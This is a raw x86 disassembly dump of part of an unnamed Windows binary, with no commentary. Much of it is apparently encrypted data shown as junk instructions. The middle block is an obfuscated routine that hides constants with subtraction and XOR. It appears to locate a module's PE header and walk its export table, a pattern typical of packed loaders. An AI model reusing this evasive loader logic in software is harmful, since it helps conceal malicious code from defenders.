  40e1e4:	cmp    esp,DWORD PTR [ebx-0x6e]
  40e1e7:	or     DWORD PTR [ebx+0x73],ebx
  40e1ea:	aad    0x8a
  40e1ec:	xchg   BYTE PTR [edi-0x56],al
  40e1ef:	mov    al,0xfb
  40e1f1:	inc    ebx
  40e1f2:	pop    esp
  40e1f3:	mov    ebp,0x45c74199
  40e1f8:	lds    eax,FWORD PTR [edi-0x7a]
  40e1fb:	jnp    0x40e1f0
  40e1fd:	inc    edx
  40e1fe:	pop    esi
  40e1ff:	loop   0x40e1ec
  40e201:	sbb    al,0xa3
  40e203:	mov    edi,0x99ccaa37
  40e208:	dec    ecx
  40e209:	push   ebp
  40e20a:	ret    
  40e20b:	cmc    
  40e20c:	and    BYTE PTR [eax],0x77
  40e20f:	add    eax,DWORD PTR [esi+ebx*4+0x1d]
  40e213:	mov    ah,0x47
  40e215:	push   ecx
  40e216:	aas    
  40e217:	xlat   BYTE PTR ds:[ebx]
  40e218:	das    
  40e219:	xchg   DWORD PTR [edx+0x4ea74e20],edi
  40e21f:	cld    
  40e220:	or     DWORD PTR [esi-0x3e],esp
  40e223:	sub    al,0xdf
  40e225:	out    dx,eax
  40e226:	pushf  
  40e227:	(bad)  
  40e229:	test   eax,0x43680920
  40e22e:	push   edx
  40e22f:	fs ins BYTE PTR es:[edi],dx
  40e231:	rep ins BYTE PTR es:[edi],dx
  40e233:	push   ss
  40e234:	pushf  
  40e235:	gs sbb al,0x4f
  40e238:	dec    edx
  40e239:	fmul   DWORD PTR [esi+0x13]
  40e23c:	or     DWORD PTR [edi+ecx*2],ebp
  40e23f:	dec    ebx
  40e240:	lds    edi,FWORD PTR [edx]
  40e242:	iret   
  40e243:	out    dx,al
  40e244:	mov    ds:0x21335ccc,eax
  40e249:	shr    DWORD PTR ds:0xc995d7e7,cl
  40e24f:	test   eax,0x346383ff
  40e254:	mov    eax,ds:0xcc80e59f
  40e259:	mov    ecx,0xc7ebb11a
  40e25e:	and    eax,0xb399b1dc
  40e263:	popf   
  40e264:	jecxz  0x40e2c1
  40e266:	inc    edi
  40e267:	add    al,0xc1
  40e269:	daa    
  40e26a:	test   DWORD PTR [ebx],edx
  40e26c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e26d:	mov    ds:0xfd378ac2,eax
  40e272:	mov    BYTE PTR ds:0x12c1d623,bl
  40e278:	fadd   QWORD PTR [esi+0x2c]
  40e27b:	fmul   DWORD PTR [ebx]
  40e27d:	outs   dx,BYTE PTR ds:[esi]
  40e27e:	in     al,0xeb
  40e280:	fisub  DWORD PTR [ebp+0x328ba8e0]
  40e286:	enter  0x2e57,0x60
  40e28a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e28b:	das    
  40e28c:	(bad)  [edi-0xa4caa01]
  40e292:	ret    0x2c3b
  40e295:	cld    
  40e296:	xchg   DWORD PTR [ecx+0x7],ecx
  40e299:	inc    edx
  40e29a:	dec    ebp
  40e29b:	inc    eax
  40e29c:	clc    
  40e29d:	sahf   
  40e29e:	adc    al,0x82
  40e2a0:	xlat   BYTE PTR ds:[ebx]
  40e2a1:	mov    ds:0xcea04c86,al
  40e2a6:	dec    bx
  40e2a8:	gs sbb ebx,edi
  40e2ab:	mov    al,ds:0xe9503a56
  40e2b0:	xlat   BYTE PTR ds:[ebx]
  40e2b1:	or     al,0x63
  40e2b3:	bound  eax,QWORD PTR [ecx-0x7b]
  40e2b6:	test   bh,cl
  40e2b8:	mov    cl,0xfd
  40e2ba:	(bad)  [edx+ebp*4+0x264872c6]
  40e2c1:	xor    edx,DWORD PTR [esi-0x67]
  40e2c4:	ret    0xdfb3
  40e2c7:	in     al,dx
  40e2c8:	retf   0x6754
  40e2cb:	stos   BYTE PTR es:[edi],al
  40e2cc:	and    al,0x86
  40e2ce:	xor    eax,0x40a34f92
  40e2d3:	and    esi,ecx
  40e2d5:	xor    DWORD PTR cs:0x9cc8a493,esi
  40e2dc:	add    al,0x21
  40e2de:	in     eax,dx
  40e2df:	clc    
  40e2e0:	cwde   
  40e2e1:	cmc    
  40e2e2:	pusha  
  40e2e3:	dec    esp
  40e2e4:	(bad)  
  40e2e5:	mov    dh,0x86
  40e2e7:	push   eax
  40e2e8:	fldcw  WORD PTR [edx-0x44]
  40e2eb:	mov    al,0x8a
  40e2ed:	popf   
  40e2ee:	xor    BYTE PTR [eax+ebp*8],dl
  40e2f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e2f2:	loope  0x40e341
  40e2f4:	pop    es
  40e2f5:	enter  0x66d6,0x48
  40e2f9:	mov    edi,0x5b1aede1
  40e2fe:	xor    eax,0xf04c6384
  40e303:	sar    DWORD PTR [edx-0xda39d45],1
  40e309:	shr    DWORD PTR [ebx-0x6],cl
  40e30c:	mov    DWORD PTR [ebx],edi
  40e30e:	popa   
  40e30f:	mov    WORD PTR [ebp+0x4f15f1ee],gs
  40e315:	pushf  
  40e316:	jne    0x40e34b
  40e318:	(bad)  
  40e319:	ins    BYTE PTR es:[edi],dx
  40e31a:	popf   
  40e31b:	lahf   
  40e31c:	pop    eax
  40e31d:	inc    esp
  40e31e:	adc    eax,0x58841f43
  40e323:	xlat   BYTE PTR ds:[ebx]
  40e324:	jle    0x40e315
  40e326:	aad    0xcd
  40e328:	push   esp
  40e329:	sub    DWORD PTR [edi-0x33e52f0c],0xbd1bda08
  40e333:	lds    esi,FWORD PTR [ecx]
  40e335:	stos   DWORD PTR es:[edi],eax
  40e336:	jge    0x40e2eb
  40e338:	sbb    eax,0xf4b233f8
  40e33d:	das    
  40e33e:	test   BYTE PTR [ecx],dh
  40e340:	jl     0x40e2d9
  40e342:	xchg   DWORD PTR [esi],edi
  40e344:	pop    ss
  40e345:	xor    ebp,eax
  40e347:	lea    edx,[esi]
  40e349:	ror    DWORD PTR [eax-0x13bd9795],0x93
  40e350:	in     eax,0xf1
  40e352:	into   
  40e353:	sbb    eax,0xefd8751b
  40e358:	sar    DWORD PTR [ebp-0x29],1
  40e35b:	and    BYTE PTR [ebp+eiz*4-0x63],dl
  40e35f:	shl    ebp,cl
  40e361:	push   ecx
  40e362:	in     eax,dx
  40e363:	outs   dx,DWORD PTR ds:[esi]
  40e364:	mov    ?,ecx
  40e366:	inc    edx
  40e367:	fst    DWORD PTR [ecx+ebx*1-0x1fbf972f]
  40e36e:	vpcmov ymm9,ymm3,YMMWORD PTR [edi],ymm6
  40e374:	pusha  
  40e375:	les    edx,FWORD PTR [ebp+0x9fb9f35]
  40e37b:	add    eax,edx
  40e37d:	imul   eax,DWORD PTR [esi]
  40e380:	or     esi,0x11ff
  40e386:	mov    esi,DWORD PTR [ebp+0x8]
  40e389:	or     DWORD PTR ds:0x420e7e,0x420fac
  40e393:	xor    esi,ecx
  40e395:	and    DWORD PTR ds:0x420e7a,0x420f6c
  40e39f:	add    esi,edx
  40e3a1:	mov    DWORD PTR ds:0x420f04,0x5e6d
  40e3ab:	cmp    esi,eax
  40e3ad:	mov    eax,0x6dd0
  40e3b2:	mov    eax,DWORD PTR [ebp-0x4]
  40e3b5:	push   ebx
  40e3b6:	mov    DWORD PTR ds:0x420efc,0x12bd
  40e3c0:	je     0x40e450
  40e3c6:	and    DWORD PTR ds:0x420e92,0x0
  40e3d0:	jmp    0x40e3e2
  40e3d5:	mov    esi,DWORD PTR ds:0x420e92
  40e3db:	inc    esi
  40e3dc:	mov    DWORD PTR ds:0x420e92,esi
  40e3e2:	cmp    DWORD PTR ds:0x420e92,0x1b
  40e3e9:	jae    0x40e407
  40e3ef:	cmp    DWORD PTR ds:0x420e92,0x23
  40e3f6:	jne    0x40e402
  40e3fc:	call   DWORD PTR ds:0x424811
  40e402:	jmp    0x40e3d5
  40e407:	mov    esi,DWORD PTR [ebp-0x18]
  40e40a:	add    DWORD PTR [eax],esi
  40e40c:	add    eax,esi
  40e40e:	mov    eax,DWORD PTR [ebp-0x4]
  40e411:	sub    esi,DWORD PTR ds:0x420fb0
  40e417:	mov    esi,DWORD PTR [ebp+0xc]
  40e41a:	xor    DWORD PTR ds:0x420efc,0x420e8e
  40e424:	xor    esi,ecx
  40e426:	add    esi,edx
  40e428:	sbb    DWORD PTR ds:0x420ef8,0x67e3
  40e432:	imul   esi,DWORD PTR [eax]
  40e435:	mov    DWORD PTR ds:0x420f00,0x5d4a
  40e43f:	mov    DWORD PTR [eax],esi
  40e441:	mov    DWORD PTR ds:0x420efc,0x3930
  40e44b:	jmp    0x40e4ec
  40e450:	mov    esi,DWORD PTR [ebp+0x14]
  40e453:	and    DWORD PTR ds:0x420f68,0x0
  40e45d:	mov    ebx,DWORD PTR ds:0x420f68
  40e463:	inc    ebx
  40e464:	mov    DWORD PTR ds:0x420f68,ebx
  40e46a:	cmp    DWORD PTR ds:0x420f68,0x21
  40e471:	jne    0x40e482
  40e477:	push   0x420f08
  40e47c:	call   DWORD PTR ds:0x424815
  40e482:	cmp    DWORD PTR ds:0x420f68,0x19
  40e489:	jb     0x40e45d
  40e48f:	and    DWORD PTR ds:0x42201c,0x0
  40e499:	mov    edi,DWORD PTR ds:0x42201c
  40e49f:	inc    edi
  40e4a0:	mov    DWORD PTR ds:0x42201c,edi
  40e4a6:	cmp    DWORD PTR ds:0x42201c,0xd
  40e4ad:	jne    0x40e4c3
  40e4b3:	push   0x5b5d
  40e4b8:	push   0x5762
  40e4bd:	call   DWORD PTR ds:0x4247d5
  40e4c3:	cmp    DWORD PTR ds:0x42201c,0xc
  40e4ca:	jne    0x40e4dd
  40e4d0:	mov    edi,DWORD PTR ds:0x42201c
  40e4d6:	inc    edi
  40e4d7:	mov    DWORD PTR ds:0x42201c,edi
  40e4dd:	cmp    DWORD PTR ds:0x42201c,0x16
  40e4e4:	jb     0x40e499
  40e4ea:	xor    DWORD PTR [eax],esi
  40e4ec:	adc    ebx,DWORD PTR ds:0x420f58
  40e4f2:	mov    eax,DWORD PTR [ebp-0x4]
  40e4f5:	mov    edi,DWORD PTR [ebp+0x10]
  40e4f8:	mov    ebx,DWORD PTR ds:0x420ebe
  40e4fe:	mov    esi,DWORD PTR ds:0x420f80
  40e504:	sub    ebx,esi
  40e506:	add    ebx,DWORD PTR [ebx+esi*1]
  40e509:	xor    edi,ecx
  40e50b:	mov    ebx,DWORD PTR ds:0x420fb0
  40e511:	add    DWORD PTR ds:0x420efc,ebx
  40e517:	mov    esi,0xffcd8d23
  40e51c:	inc    ebx
  40e51d:	mov    ebx,esi
  40e51f:	sub    ebx,edi
  40e521:	add    DWORD PTR [eax],ebx
  40e523:	adc    edi,0x4f91
  40e529:	mov    eax,DWORD PTR [ebp-0x4]
  40e52c:	mov    edi,DWORD PTR [ebp-0x8]
  40e52f:	xor    DWORD PTR ds:0x420e8e,0x422014
  40e539:	add    edi,DWORD PTR [eax]
  40e53b:	mov    DWORD PTR [ebp-0x8],edi
  40e53e:	mov    eax,DWORD PTR [ebp+0xc]
  40e541:	mov    edi,DWORD PTR [ebp+0xc]
  40e544:	xor    edi,ecx
  40e546:	xor    eax,ecx
  40e548:	lea    eax,[eax+edi*1+0x64e5ba]
  40e54f:	mov    edi,DWORD PTR [ebp+0xc]
  40e552:	xor    edi,ecx
  40e554:	add    edi,edx
  40e556:	imul   eax,edi
  40e559:	mov    edi,DWORD PTR [ebp+0xc]
  40e55c:	xor    edi,ecx
  40e55e:	sub    edi,eax
  40e560:	mov    eax,DWORD PTR [ebp-0x4]
  40e563:	add    edi,edx
  40e565:	cmp    DWORD PTR [eax],edi
  40e567:	mov    eax,DWORD PTR [ebp-0x4]
  40e56a:	mov    edi,DWORD PTR [ebp+0x10]
  40e56d:	jg     0x40e580
  40e573:	xor    edi,ecx
  40e575:	mov    ebx,esi
  40e577:	sub    ebx,edi
  40e579:	add    DWORD PTR [eax],ebx
  40e57b:	jmp    0x40e586
  40e580:	xor    edi,ecx
  40e582:	add    edi,edx
  40e584:	add    DWORD PTR [eax],edi
  40e586:	mov    eax,DWORD PTR [ebp-0x8]
  40e589:	mov    edi,DWORD PTR [ebp-0x10]
  40e58c:	mov    eax,DWORD PTR [eax]
  40e58e:	xor    edi,ecx
  40e590:	add    edi,0x3272dc
  40e596:	not    edi
  40e598:	and    eax,edi
  40e59a:	movsx  di,BYTE PTR [eax+0x1]
  40e59f:	mov    ebx,0x3b4c
  40e5a4:	sub    di,bx
  40e5a7:	mov    ebx,0x8a89
  40e5ac:	xor    di,bx
  40e5af:	mov    ebx,0x4f87
  40e5b4:	cmp    di,bx
  40e5b7:	jne    0x40e5df
  40e5bd:	movsx  di,BYTE PTR [eax]
  40e5c1:	mov    ebx,0x3b4c
  40e5c6:	sub    di,bx
  40e5c9:	mov    ebx,0x8a89
  40e5ce:	xor    di,bx
  40e5d1:	mov    ebx,0x4f88
  40e5d6:	cmp    di,bx
  40e5d9:	je     0x40e5ef
  40e5df:	mov    edi,DWORD PTR [ebp-0x10]
  40e5e2:	xor    edi,ecx
  40e5e4:	mov    ebx,esi
  40e5e6:	sub    ebx,edi
  40e5e8:	add    eax,ebx
  40e5ea:	jmp    0x40e59a
  40e5ef:	mov    esi,DWORD PTR [ebp-0x14]
  40e5f2:	mov    esi,DWORD PTR [esi]
  40e5f4:	mov    edi,DWORD PTR [eax+0x3c]
  40e5f7:	lea    esi,[edi+esi*8+0x78]
  40e5fb:	mov    esi,DWORD PTR [esi+eax*1]
  40e5fe:	mov    DWORD PTR [ebp-0x8],esi
  40e601:	mov    esi,DWORD PTR [ebp+0x8]
  40e604:	xor    esi,ecx
  40e606:	add    esi,edx
  40e608:	mov    DWORD PTR [ebp-0x14],esi
  40e60b:	mov    esi,DWORD PTR [ebp+0x8]
  40e60e:	mov    edi,DWORD PTR [ebp-0x8]
  40e611:	xor    esi,ecx
  40e613:	add    esi,edx
  40e615:	pop    ebx
  40e616:	cmp    edi,esi
  40e618:	jne    0x40e636
  40e61e:	mov    eax,DWORD PTR [ebp+0xc]
  40e621:	xor    eax,ecx
  40e623:	mov    ecx,DWORD PTR [ebp-0x8]
  40e626:	add    eax,edx
  40e628:	imul   eax,ecx
  40e62b:	mov    DWORD PTR [ebp-0x8],eax
  40e62e:	push   DWORD PTR [ebp+0x18]
  40e631:	jmp    0x410a04
  40e636:	mov    ecx,DWORD PTR [ebp-0x8]
  40e639:	add    ecx,eax
  40e63b:	mov    DWORD PTR [ebp-0x14],ecx
  40e63e:	mov    ecx,DWORD PTR [ebp-0x14]
  40e641:	mov    ecx,DWORD PTR [ecx+0xc]
  40e644:	movsx  cx,BYTE PTR [ecx+eax*1]
  40e649:	mov    edx,0x3b4c
  40e64e:	sub    cx,dx
  40e651:	mov    edx,0x8a89
  40e656:	xor    cx,dx
  40e659:	mov    edx,0x4e76
  40e65e:	jmp    0x4109d8
  40e663:	stc    
  40e664:	add    BYTE PTR [edx+ebp*1],bh
  40e667:	pop    ss
  40e668:	push   cs
  40e669:	sti    
  40e66a:	or     ebx,DWORD PTR [ebx]
  40e66c:	mov    edx,0x1df5ef2
  40e671:	xchg   BYTE PTR [esi+0x73],dh
  40e674:	retf   0x7a7a
  40e677:	sbb    DWORD PTR [edi+0x7a],ebx
  40e67a:	jp     0x40e5ff
  40e67c:	fdiv   DWORD PTR [eax]
  40e67e:	inc    ebp
  40e67f:	pop    ds
  40e680:	jg     0x40e641
  40e682:	or     ebx,esi
  40e684:	and    edx,DWORD PTR [edi+0xb]
  40e687:	mov    ebp,0x977fa317
  40e68c:	cmp    eax,0xab99ea78
  40e691:	ds out 0x86,al
  40e694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e695:	inc    ebx
  40e696:	dec    ecx
  40e697:	(bad)  
  40e69a:	mov    ecx,0xf42f6341
  40e69f:	inc    eax
  40e6a0:	inc    esi
  40e6a1:	or     al,0x56
  40e6a3:	loopne 0x40e656
  40e6a5:	push   esi
  40e6a6:	mov    bl,0xb
  40e6a8:	xor    al,0xa0
  40e6aa:	gs push esi
  40e6ac:	lock push eax
  40e6ae:	sbb    ebx,esp
  40e6b0:	cmc    
  40e6b1:	mov    ebp,0x45aac4cf
  40e6b6:	push   ebx
  40e6b7:	jg     0x40e729
  40e6b9:	mov    dl,0xa3
  40e6bb:	data16 arpl WORD PTR [edx+0x8],bp
  40e6bf:	jge    0x40e68a
  40e6c1:	call   0x2048e1e8
  40e6c6:	(bad)  
  40e6c7:	(bad)  [eax+0x2e]
  40e6ca:	lods   eax,DWORD PTR ds:[esi]
  40e6cb:	mov    dl,0x94
  40e6cd:	push   ss
  40e6ce:	(bad)  
  40e6cf:	aad    0xa5
  40e6d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6d2:	aaa    
  40e6d3:	clc    
  40e6d4:	adc    esi,DWORD PTR [edi+0x50]
  40e6d7:	and    esi,DWORD PTR [ecx-0x1dbf3929]
  40e6dd:	mov    esp,DWORD PTR [edx+0x44]
  40e6e0:	mov    BYTE PTR [edi+0x14],bh
  40e6e3:	mov    ch,0x35
  40e6e5:	push   eax
  40e6e6:	fisubr WORD PTR [ecx+ebp*4-0x532ffaa9]
  40e6ed:	shr    DWORD PTR ds:0x535a6f9b,1
  40e6f3:	mov    cs,WORD PTR [esi]
  40e6f5:	data16 in al,0x13
  40e6f8:	aad    0x77
  40e6fa:	out    0xe7,eax
  40e6fc:	xor    eax,DWORD PTR [eax+ebp*8+0x4b]
  40e700:	pop    ecx
  40e701:	push   edx
  40e702:	or     ebp,DWORD PTR [esi]
  40e704:	sub    DWORD PTR ds:0x43d59424,0xffffff8e
  40e70b:	mov    dh,0xe6
  40e70d:	retf   
  40e70e:	mov    esp,DWORD PTR [esi+0x601637b2]
  40e714:	xchg   edi,eax
  40e715:	pop    es
  40e716:	aam    0x3
  40e718:	push   esi
  40e719:	mov    BYTE PTR [ebx+0x5e],0x81
  40e71d:	fwait
  40e71e:	pop    edx
  40e71f:	jl     0x40e6ae
  40e721:	aad    0xfa
  40e723:	lods   eax,DWORD PTR ds:[esi]
  40e724:	cs sbb eax,0x518cdae4
  40e72a:	cld    
  40e72b:	pop    esi
  40e72c:	push   cs
  40e72d:	scas   eax,DWORD PTR es:[edi]
  40e72e:	sub    eax,0x2ba42bc9
  40e733:	xor    al,0x12
  40e735:	aam    0xf
  40e737:	jb     0x40e763
  40e739:	pop    ebp
  40e73a:	mov    al,BYTE PTR [esi+0x22]
  40e73d:	clc    
  40e73e:	call   DWORD PTR [ebp+0x57]
  40e741:	xor    DWORD PTR fs:[edi],eax
  40e744:	jp     0x40e78d
  40e746:	mov    eax,ds:0x9dc9ea65
  40e74b:	jnp    0x40e71c
  40e74d:	xor    BYTE PTR [ebx+0x3d5b9393],dl
  40e753:	mov    ah,0xf8
  40e755:	and    al,0x6c
  40e757:	dec    edi
  40e758:	and    dh,dh
  40e75a:	jmp    0x957ac617
  40e75f:	(bad)  
  40e761:	cmp    ebx,DWORD PTR [ecx]
  40e763:	xchg   edi,eax
  40e764:	dec    esi
  40e765:	jl     0x40e7c0
  40e767:	xchg   ebx,eax
  40e768:	aaa    
  40e769:	aas    
  40e76a:	push   0x8e56be0b
  40e76f:	inc    eax
  40e770:	xor    esi,DWORD PTR [esi-0x4b]
  40e773:	mov    ebx,DWORD PTR [ebx-0x3a]
  40e776:	leave  
  40e777:	xchg   esi,eax
  40e778:	lahf   
  40e779:	mov    edi,esp
  40e77b:	cs loop 0x40e7a9
  40e77e:	rol    DWORD PTR [esi-0xcb2fbba],cl
  40e784:	or     DWORD PTR [edi-0x50],esi
  40e787:	out    dx,eax
  40e788:	pop    ds
  40e789:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e78a:	cld    
  40e78b:	es das 
  40e78d:	sbb    edi,esi
  40e78f:	aas    
  40e790:	xchg   esp,eax
  40e791:	mov    DWORD PTR [edx],ebp
  40e793:	ficomp WORD PTR ds:[ecx-0x6cbf5db3]
  40e79a:	int    0xf7
  40e79c:	sub    BYTE PTR [ecx-0x10411e37],cl
  40e7a2:	lods   eax,DWORD PTR ds:[esi]
  40e7a3:	ins    DWORD PTR es:[edi],dx
  40e7a4:	inc    edx
  40e7a5:	jg     0x40e790
  40e7a7:	scas   al,BYTE PTR es:[edi]
  40e7a8:	xor    ebp,edi
  40e7aa:	neg    ecx
  40e7ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7ad:	mov    edx,0x8ed2ca95
  40e7b2:	ret    0x8230
  40e7b5:	mov    al,0x39
  40e7b7:	lds    eax,FWORD PTR [eax]
  40e7b9:	push   edx
  40e7ba:	or     esp,ebp
  40e7bc:	pop    ecx
  40e7bd:	loope  0x40e7f2
  40e7bf:	jbe    0x40e7fd
  40e7c1:	inc    ecx
  40e7c2:	xor    al,0xaf
  40e7c4:	pop    esp
  40e7c5:	sbb    dl,BYTE PTR [edi]
  40e7c7:	lahf   
  40e7c8:	mov    dl,0x5d
  40e7ca:	aam    0x6a
  40e7cc:	sbb    al,BYTE PTR [ebp+0x697c289]
  40e7d2:	(bad)  
  40e7d3:	and    DWORD PTR [ebx+0x9],edx
  40e7d6:	cmp    eax,DWORD PTR [ecx-0x29415789]
  40e7dc:	sar    DWORD PTR [esi+0x642190b3],1
  40e7e2:	sbb    eax,0x5c298cc
  40e7e7:	fwait
  40e7e8:	dec    esp
  40e7e9:	sbb    BYTE PTR [eax+0x1],bl
  40e7ec:	ins    BYTE PTR es:[edi],dx
  40e7ed:	or     DWORD PTR [ebx+0x25],ebx
  40e7f0:	cmp    BYTE PTR [esi],al
  40e7f2:	mov    ebp,0x31fc27d5
  40e7f7:	mov    esp,DWORD PTR [ebx+edx*2-0x18ed0791]
  40e7fe:	push   ecx
  40e7ff:	sbb    al,0x62
  40e801:	and    eax,0xe9d24e8f
  40e806:	fwait
  40e807:	xlat   BYTE PTR ds:[ebx]
  40e808:	mov    dh,0x33
  40e80b:	test   dl,bh
  40e80d:	test   edx,edx
  40e80f:	mov    ah,0x16
  40e811:	rcl    BYTE PTR [ebp+0x4457d788],cl
  40e817:	scas   eax,DWORD PTR es:[edi]
  40e818:	add    BYTE PTR [ecx+0x3d],al
  40e81b:	(bad)  
  40e81c:	clc    
  40e81d:	xchg   esp,ebp
  40e81f:	stos   DWORD PTR es:[edi],eax
  40e820:	mov    al,0x44
  40e822:	bound  ebp,QWORD PTR [edi+0x73]
  40e825:	mov    bh,0x7b
  40e827:	fisub  DWORD PTR [edx]
  40e829:	or     ebp,ecx
  40e82b:	pushw  ds
  40e82d:	fcmove st,st(3)
  40e82f:	and    ebx,edx
  40e831:	and    eax,0xf24aa67b
  40e836:	ret    0x69e
  40e839:	imul   ebp,DWORD PTR [eax+0x143ec361],0x71
  40e840:	call   0xd0ae:0xaefdf0d0
  40e847:	mov    ecx,0x5099c2c6
  40e84c:	rcl    DWORD PTR [eax+0x4f84a4fb],1
  40e852:	mov    esp,0x2f185fcf
  40e857:	int3   
  40e858:	enter  0x5b4f,0x6e
  40e85c:	inc    eax
  40e85d:	xchg   ecx,eax
  40e85e:	inc    ebx
  40e85f:	and    cl,BYTE PTR [ecx+0x24]
  40e862:	inc    edx
  40e863:	aas    
  40e864:	mov    cl,0x24
  40e866:	in     eax,dx
  40e867:	xor    al,0xbc
  40e869:	dec    esp
  40e86a:	xchg   esi,eax
  40e86b:	aam    0xd4
  40e86d:	dec    edi
  40e86e:	sahf   
  40e86f:	loopne 0x40e837
  40e871:	xchg   edx,eax
  40e872:	ficom  WORD PTR [ecx]
  40e874:	hlt    
  40e875:	xor    al,0x20
  40e877:	test   eax,0xbf3c6706
  40e87c:	loop   0x40e884
  40e87e:	xor    ecx,DWORD PTR [edx-0x1a]
  40e881:	jnp    0x40e8b0
  40e883:	pop    edx
  40e884:	lahf   
  40e885:	pop    ebx
  40e886:	int    0xee
  40e888:	xchg   esp,eax
  40e889:	retf   
  40e88a:	leave  
  40e88b:	xor    DWORD PTR [edx+ecx*4],esi
  40e88e:	daa    
  40e88f:	and    DWORD PTR [edx-0x5614ca67],esp
  40e895:	fidivr WORD PTR [edi-0x5c5b8672]
  40e89b:	xor    al,0x3b
  40e89d:	leave  
  40e89e:	test   al,0xf1
  40e8a0:	fld    DWORD PTR [eiz*2-0x55cd057d]
  40e8a7:	in     eax,0x5d
  40e8a9:	pop    esi
  40e8aa:	daa    
  40e8ab:	test   eax,0xbc9405f2
  40e8b0:	xchg   BYTE PTR [ecx],bh
  40e8b2:	jnp    0x40e8c9
  40e8b4:	inc    esi
  40e8b5:	mov    dl,0x46
  40e8b7:	js     0x40e8d9
  40e8b9:	jns    0x40e8cf
  40e8bb:	out    dx,eax
  40e8bc:	test   BYTE PTR [edi+0x7ab771af],cl
  40e8c2:	sbb    al,0xdb
  40e8c4:	jne    0x40e88f
  40e8c6:	add    ecx,DWORD PTR ds:0x73655d67
  40e8cc:	jmp    0x7d17cff3
  40e8d1:	push   ds
  40e8d2:	inc    esi
  40e8d3:	push   ebx
  40e8d4:	inc    eax
  40e8d5:	or     bh,0xf8
  40e8d8:	or     DWORD PTR [ebp-0x3ff5083f],ebp
  40e8de:	stc    
  40e8df:	pop    es
  40e8e0:	add    eax,0x83e99c86
  40e8e5:	mov    edi,0xd5aa0877
  40e8ea:	xchg   esi,eax
  40e8eb:	inc    edx
  40e8ec:	loop   0x40e877
  40e8ee:	imul   edi,DWORD PTR [ebx],0xcf80f35
  40e8f4:	adc    ah,BYTE PTR [ebx+0x62]
  40e8f7:	imul   edi,DWORD PTR [edi],0x1cba389f
  40e8fd:	push   ss
  40e8fe:	(bad)  
  40e900:	add    BYTE PTR [edx+0x302cc81f],ah
  40e906:	mov    ah,0xeb
  40e908:	shr    BYTE PTR [eax+0x46],cl
  40e90b:	mov    bl,0x1e
  40e90d:	fild   DWORD PTR [eax-0x44]
  40e910:	popa   
  40e911:	adc    cl,BYTE PTR [ecx]
  40e913:	fwait
  40e914:	xchg   ecx,eax
  40e915:	mov    eax,ds:0x96bdc265
  40e91a:	jbe    0x40e92e
  40e91c:	and    al,0xa1
  40e91e:	rcl    DWORD PTR [eax+ebx*2-0x36],1
  40e922:	push   0xe1cdd65f
  40e927:	or     eax,0xe710f8ab
  40e92c:	mov    al,ds:0x17c0a57
  40e931:	aas    
  40e932:	cmp    eax,edi
  40e934:	cli    
  40e935:	jp     0x40e9a1
  40e937:	pop    ds
  40e938:	dec    ecx
  40e939:	arpl   WORD PTR [eax-0x69],si
  40e93c:	mov    bh,0xeb
  40e93e:	inc    edi
  40e93f:	addr16 mov ch,0xa9
  40e942:	gs mov ebp,0x715cfb13
  40e948:	dec    ecx
  40e949:	xchg   DWORD PTR [esi+0x37],eax
  40e94c:	or     eax,0x5ffc3ab3
  40e952:	jb     0x40e8f4
  40e954:	cld    
  40e955:	call   0x18e72e87
  40e95a:	fwait
  40e95b:	out    0x6d,al
  40e95d:	out    dx,eax
  40e95e:	ja     0x40e91e
  40e960:	inc    ebp
  40e961:	les    esp,FWORD PTR [edi-0xb27a7cb]
  40e967:	cmp    al,0xb0
  40e969:	in     al,dx
  40e96a:	aad    0x76
  40e96c:	nop
  40e96d:	pop    esp
  40e96e:	cli    
  40e96f:	outs   dx,BYTE PTR ds:[esi]
  40e970:	lods   al,BYTE PTR ds:[esi]
  40e971:	inc    esp
  40e972:	ds pop edx
  40e974:	push   ds
  40e975:	div    BYTE PTR [eax-0x24dc7a6]
  40e97b:	js     0x40e974
  40e97d:	dec    ebp
  40e97e:	or     ebp,eax
  40e980:	lods   al,BYTE PTR ds:[esi]
  40e981:	pop    ds
  40e982:	or     bh,bl
  40e984:	scas   al,BYTE PTR es:[edi]
  40e985:	sub    eax,0x6ea835bb
  40e98a:	in     eax,dx
  40e98b:	data16 (bad) 
  40e98d:	pop    ss
  40e98e:	test   DWORD PTR [ebx],0x4467939c
  40e994:	lahf   
  40e995:	mov    al,0xe3
  40e997:	jnp    0x40e975
  40e999:	pop    esi
  40e99a:	xchg   esp,eax
  40e99b:	popa   
  40e99c:	aad    0x88
  40e99e:	out    0xf,eax
  40e9a0:	loop   0x40e9de
  40e9a2:	jg     0x40e9ff
  40e9a4:	fisttp WORD PTR ds:0xd7ba1e52
  40e9aa:	mov    dh,0x2
  40e9ac:	inc    edi
  40e9ad:	sbb    DWORD PTR fs:[edx+0x42],edx
  40e9b1:	mov    bl,0x1
  40e9b3:	arpl   WORD PTR [esi+0x63c56d7],bx
  40e9b9:	mov    bl,0x30
  40e9bb:	and    BYTE PTR [esi+0x3212267],dh
  40e9c1:	adc    DWORD PTR [ebx+0x2b],esp
  40e9c4:	xchg   ebp,eax
  40e9c5:	out    dx,al
  40e9c6:	jp     0x40ea1b
  40e9c8:	inc    ebx
  40e9c9:	(bad)  
  40e9cd:	int    0x95
  40e9cf:	pop    ds
  40e9d0:	gs cwde 
  40e9d2:	(bad)  
  40e9d3:	jae    0x40e9f1
  40e9d5:	mov    ebx,0x21d2d47c
  40e9da:	loopne 0x40e9d3
  40e9dc:	xchg   ebp,eax
  40e9dd:	loop   0x40ea48
  40e9df:	shl    dl,1
  40e9e1:	push   esp
  40e9e2:	and    eax,0x10a15bba
  40e9e7:	mov    DWORD PTR [ecx],ebx
  40e9e9:	add    bl,BYTE PTR [esi+0x38ffa7f1]
  40e9ef:	movhps xmm3,QWORD PTR [esi]
  40e9f2:	jb     0x40ea4c
  40e9f4:	enter  0xcbac,0xa9
  40e9f8:	sbb    al,0xad
  40e9fa:	or     ecx,DWORD PTR [eax-0x3aa9c0f1]
  40ea00:	adc    ch,BYTE PTR [ebp+0x7c]
  40ea03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea04:	lea    ecx,ds:[ecx+0x219294b1]
  40ea0b:	sub    ebx,DWORD PTR [esi-0x24]
